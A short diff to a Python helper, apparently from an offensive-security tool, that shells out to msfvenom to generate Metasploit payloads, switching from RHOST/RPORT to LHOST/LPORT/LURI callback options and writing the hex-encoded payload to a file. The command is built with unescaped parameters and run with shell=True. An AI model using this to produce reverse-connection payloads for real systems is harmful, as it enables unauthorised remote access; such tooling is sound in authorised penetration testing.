@@ -1,7 +1,8 @@
 import subprocess
 
 def msfvenom(payload, rhost, rport, ruri):
-    print(f"msfvenom is generating payload for {payload} ...")
-    RURI_part = f" RURI={ruri}" if ruri else ""
-    command = f"msfvenom -p {payload} RHOST={rhost} RPORT={rport} {RURI_part} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
+    print(f"Generating payload :")
+    RURI_part = f" LURI={ruri}" if ruri else ""
+    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
+    print(command)
     subprocess.run(command, shell=True, check=True)
